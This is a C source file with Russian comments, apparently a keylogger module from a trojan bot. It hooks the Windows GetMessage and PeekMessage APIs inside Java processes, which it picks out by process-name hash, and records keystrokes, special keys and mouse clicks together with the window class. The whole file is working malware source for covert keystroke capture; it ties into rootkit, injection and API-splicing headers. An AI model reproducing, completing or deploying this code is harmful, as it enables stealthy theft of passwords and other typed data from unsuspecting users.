#include <windows.h>
#include <windowsx.h>

#include "GetApi.h"
//#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
//#include "Crypt.h"
#include "Unhook.h"
#include "Splice.h"


#include "KeyLogger.h"


// Все функции которые мы будем хучить для KeyLogger
typedef BOOL ( WINAPI *PPeekMessage )( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                                       UINT wMsgFilterMax, UINT wRemoveMsg );

typedef BOOL ( WINAPI *PGetMessage )( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                                      UINT wMsgFilterMax);

// Перехватываем как ANSI, так и UNICODE
static PGetMessage	Real_GetMessageA;
static PPeekMessage	Real_PeekMessageA;

static PGetMessage	Real_GetMessageW;
static PPeekMessage	Real_PeekMessageW;

static void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd);
static void ProcessCharMessageW(LPMSG lpMsg, HWND hWnd);

static void ProcessMouseMessageA(LPMSG lpMsg, HWND hWnd);
static void ProcessMouseMessageW(LPMSG lpMsg, HWND hWnd);

static void DumpKeyLogBufA();
static void DumpKeyLogBufW();

// Можно эти буфера выделить динамически при инициализации Кейлогера
// и очистить при выключении приложения, но тогда надо писать ф-и init/shutdown_keyloger
static CHAR  g_szKeyLogBufA[0x400] = {'\0'};
static WCHAR g_szKeyLogBufW[0x400] = {L'\0'};

static HWND g_KeyLoghWnd = 0;
static LONG g_KeyLogbPosA = 0;
static LONG g_KeyLogbPosW = 0;



/************************************************************************/
void DumpKeyLogBufA()
{
	if (0 != g_KeyLogbPosA)
	{
		// Ставим конец строки в буфере
		g_szKeyLogBufA[g_KeyLogbPosA] = '\0';

		char *OutBuf = (char *)MemAlloc(1024);
		char *ClsBuf = (char *)MemAlloc(MAX_PATH);
		if (OutBuf && ClsBuf)
		{
			GetClassNameA(g_KeyLoghWnd, ClsBuf, MAX_PATH - 1);

			wsprintfA(OutBuf, "hWnd: %x: WndClass: %s Symbols: %s", g_KeyLoghWnd, ClsBuf, g_szKeyLogBufA);
			OutputDebugStr(OutBuf);

			MemFree(ClsBuf);
			MemFree(OutBuf);
		}

		g_KeyLogbPosA = 0;
	}
}

/************************************************************************/
void DumpKeyLogBufW()
{
	if (0 != g_KeyLogbPosW)
	{
		// Ставим конец строки в буфере
		g_szKeyLogBufW[g_KeyLogbPosW] = L'\0';

		WCHAR *OutBuf = (WCHAR *)MemAlloc(1024);
		WCHAR *ClsBuf = (WCHAR *)MemAlloc(MAX_PATH);
		if (OutBuf && ClsBuf)
		{
			GetClassNameW(g_KeyLoghWnd, ClsBuf, MAX_PATH - 1);

			wsprintfW(OutBuf, L"hWnd: %x: WndClass: %s Symbols: %s", g_KeyLoghWnd, ClsBuf, g_szKeyLogBufW);
			OutputDebugStringW(OutBuf);

			MemFree(ClsBuf);
			MemFree(OutBuf);
		}

		g_KeyLogbPosW = 0;
	}
}

/************************************************************************/
void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd)
{
	// Если в самый первый раз сюда попали
	if (0 == g_KeyLoghWnd) 
	{
		// Запоминаем хэндл окна
		g_KeyLoghWnd = lpMsg->hwnd;
	}
	
	// Если перехватили нажатие клавиши в том же самом окне, то добавляем
	// символ в буфер
	if (g_KeyLoghWnd == lpMsg->hwnd)
	{
		// Символ печатный?
		if (lpMsg->wParam >= 32)
			g_szKeyLogBufA[g_KeyLogbPosA++] = (char)lpMsg->wParam;
		else
		// Обрабатываем спецклавиши
		{
			static char szWord[20] = {'\0'};
			switch (lpMsg->wParam)
			{
				case VK_RETURN:
					{
						lstrcpy(szWord, "{Enter}");
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						lstrcpy(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
						break;
					}
				case VK_BACK:
					{
						lstrcpy(szWord, "{BackSpace}"); 
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						lstrcpy(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
						break;
					}
				default:
					{
						wsprintfA(szWord, "{#%0x}", lpMsg->wParam);
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						lstrcpy(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
					}
			}// case
		}
	}
	else
	// Если это уже другое окно, то дампим буфер и начинаем заполнять его
	// с самого начала
	{
		DumpKeyLogBufA();

		// Запоминаем хэндл окна
		g_KeyLoghWnd = lpMsg->hwnd;

		g_szKeyLogBufA[g_KeyLogbPosA++] = (char)lpMsg->wParam;
	}
}

/************************************************************************/
void ProcessCharMessageW(LPMSG lpMsg, HWND hWnd)
{
	// Если в самый первый раз сюда попали
	if (0 == g_KeyLoghWnd) 
		g_KeyLoghWnd = lpMsg->hwnd;

	// Если перехватили нажатие клавиши в том же самом окне, то добавляем
	// символ в буфер
	if (g_KeyLoghWnd == lpMsg->hwnd)
	{
		// Символ печатный?
		if (lpMsg->wParam >= 32)
			g_szKeyLogBufW[g_KeyLogbPosW++] = lpMsg->wParam;
		else
		// Обрабатываем спецклавиши
		{
			static WCHAR szWord[20] = {L'\0'};
			switch (lpMsg->wParam)
			{
				case VK_RETURN:
					{
						lstrcpyW(szWord, L"{Enter}");
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
						break;
					}
				case VK_BACK:
					{
						lstrcpyW(szWord, L"{BackSpace}"); 
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
						break;
					}
				default:
					{
						wsprintfW(szWord, L"{#%0x}", lpMsg->wParam);
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
					}
			}// case		
		}
	}
	else
	// Если это уже другое окно, то дампим буфер и начинаем заполнять его
	// с самого начала
	{
		DumpKeyLogBufW();
		g_KeyLoghWnd = lpMsg->hwnd;
		g_szKeyLogBufW[g_KeyLogbPosW++] = lpMsg->wParam;
	}
}

/************************************************************************/
void ProcessMouseMessageA(LPMSG lpMsg, HWND hWnd)
{
	static char szMouseBtn[20] = {'\0'};
	static char szBuf[50] = {'\0'};
	
	if ((lpMsg->wParam & MK_LBUTTON) == MK_LBUTTON)
		lstrcpy(szMouseBtn, "{Click}"); else
	if ((lpMsg->wParam & MK_RBUTTON) == MK_RBUTTON)
		lstrcpy(szMouseBtn, "{RClick}");

	wsprintfA(szBuf, "%s (x=%d;y=%d)", szMouseBtn,
						GET_X_LPARAM(lpMsg->lParam), GET_Y_LPARAM(lpMsg->lParam));
	OutputDebugStr(szBuf);
}

/************************************************************************/
void ProcessMouseMessageW(LPMSG lpMsg, HWND hWnd)
{
	static WCHAR szMouseBtn[20] = {L'\0'};
	static WCHAR szBuf[50] = {L'\0'};
	
	if ((lpMsg->wParam & MK_LBUTTON) == MK_LBUTTON)
		lstrcpyW(szMouseBtn, L"{Click}"); else
	if ((lpMsg->wParam & MK_RBUTTON) == MK_RBUTTON)
		lstrcpyW(szMouseBtn, L"{RClick}");

	wsprintfW(szBuf, L"%s (x=%d;y=%d)", szMouseBtn,
						GET_X_LPARAM(lpMsg->lParam), GET_Y_LPARAM(lpMsg->lParam));
	OutputDebugStringW(szBuf);
}

/************************************************************************/
BOOL WINAPI Hook_PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                              UINT wMsgFilterMax, UINT wRemoveMsg)
{
	if (PM_REMOVE & wRemoveMsg)
	{
		switch (lpMsg->message)
		{
			case WM_SYSCOMMAND:
			{
				// ALT+F4
				if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
				{
					DumpKeyLogBufA();
				}
				break;
			}
			case WM_CHAR:
			{
				ProcessCharMessageA(lpMsg, hWnd);
				break;
			}
			case WM_LBUTTONDOWN:
			case WM_RBUTTONDOWN:
			{
				// Если левая кнопка, то дампим буфер
				if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
				{
					DumpKeyLogBufA();
				}
				// Для мышиного сообщения надо вначале вызывать стандартный обработчик, иначе
				// поля сообщения окажутся не заполенены
				BOOL res = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
				ProcessMouseMessageA(lpMsg, hWnd);
				return res;
			}
		}
	}
	return Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
}

/************************************************************************/
BOOL WINAPI Hook_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                              UINT wMsgFilterMax, UINT wRemoveMsg)
{															
	if (PM_REMOVE & wRemoveMsg)
	{
		switch (lpMsg->message)
		{
			case WM_SYSCOMMAND:
			{
				// ALT+F4
				if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
				{
					DumpKeyLogBufW();
				}
				break;
			}
			case WM_CHAR:
			{
				ProcessCharMessageW(lpMsg, hWnd);
				break;
			}
			case WM_LBUTTONDOWN:
			case WM_RBUTTONDOWN:
			{
				// Если левая кнопка, то дампим буфер
				if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
				{
					DumpKeyLogBufW();
				}
				// Для мышиного сообщения надо вначале вызывать стандартный обработчик, иначе
				// поля сообщения окажутся не заполенены
				BOOL res = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
				ProcessMouseMessageW(lpMsg, hWnd);
				return res;
			}
		}
	}
	return Real_PeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
}

/************************************************************************/
BOOL WINAPI Hook_GetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                             UINT wMsgFilterMax)
{
	switch (lpMsg->message)
	{
		case WM_SYSCOMMAND:
		{
			// ALT+F4
			if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
			{
				DumpKeyLogBufW();
			}
			break;
		}
		case WM_CHAR:
		{
			ProcessCharMessageW(lpMsg, hWnd);
			break;
		}
		case WM_LBUTTONDOWN:
		case WM_RBUTTONDOWN:
		{
			// Если левая кнопка, то дампим буфер
			if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
			{
				DumpKeyLogBufW();
			}
			// В отличии от PeekMessage здесь уже все
			// поля сообщения заполнены, поэтому вызываем наш обработчик
			ProcessMouseMessageW(lpMsg, hWnd);
		}
	}
	return Real_GetMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}


/************************************************************************/
BOOL WINAPI Hook_GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                             UINT wMsgFilterMax)
{
	switch (lpMsg->message)
	{
		case WM_SYSCOMMAND:
		{
			// ALT+F4
			if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
			{
				DumpKeyLogBufA();
			}
			break;
		}
		case WM_CHAR:
		{
			ProcessCharMessageA(lpMsg, hWnd);
			break;
		}
		case WM_LBUTTONDOWN:
		case WM_RBUTTONDOWN:
		{
			// Если левая кнопка, то дампим буфер
			if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
			{
				DumpKeyLogBufA();
			}
			// В отличии от PeekMessage здесь уже все
			// поля сообщения заполнены, поэтому вызываем наш обработчик
			ProcessMouseMessageA(lpMsg, hWnd);
		}
	}
	return Real_GetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}

/************************************************************************/
bool WINAPI IsKeyLoggerProcess()
{
	// Функция вернёт истину если она вызвана в процессе
	// Java.exe или Javaw.exe
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	//char szBuf[20] = {'\0'};
	//wsprintfA(szBuf, "hash: %x: ", dwProcessHash);
	OutputDebugStringW(ModulePath);
	// KeyLogTest.exe?0xD80C3E3B
	if ( dwProcessHash == 0xFC6FD0CE || dwProcessHash == 0x150CFBD3 || dwProcessHash == 0x1F1AA76A || dwProcessHash == 0xb112a4dc || dwProcessHash == 0xF8083E3B )
		{
			//OutputDebugStr("KeyLogTest process has been found!");
			MemFree( ModulePath );
			return true;
		}

	MemFree( ModulePath );
	return false;
}

/************************************************************************/
bool HookKeyLoggerApi()
{
	//DbgMsg("HookKeylogerApi",0,"BEFORE");

	if ( HookApi( 3, 0xD7A87C2C, (DWORD)&Hook_PeekMessageA ) )
	{  
		__asm mov [Real_PeekMessageA], eax			
	}	

	if ( HookApi( 3, 0xC8A274AC, (DWORD)&Hook_GetMessageA ) )
	{  
		__asm mov [Real_GetMessageA], eax			
	}	

	if ( HookApi( 3, 0xD7A87C3A, (DWORD)&Hook_PeekMessageW ) )
	{  
		__asm mov [Real_PeekMessageW], eax			
	}	

	if ( HookApi( 3, 0xC8A274BA, (DWORD)&Hook_GetMessageW ) )
	{  
		__asm mov [Real_GetMessageW], eax			
	}	
	
	//DbgMsg("HookKeylogerApi",0,"AFTER");
	
	return true;
}


/************************************************************************/
bool HookKeyLogger()
{
	// функция вешает хуки на базовые функции которые использует
	// Java для работы со своими окнами
	// Работает только в случае вызова из процесса Java

	//OutputDebugStr("HookKeyLogger");

	if ( !IsKeyLoggerProcess() )
	{
		return false;
	}

	UnhookKeyLogger();

	HookKeyLoggerApi();

	return true;
}

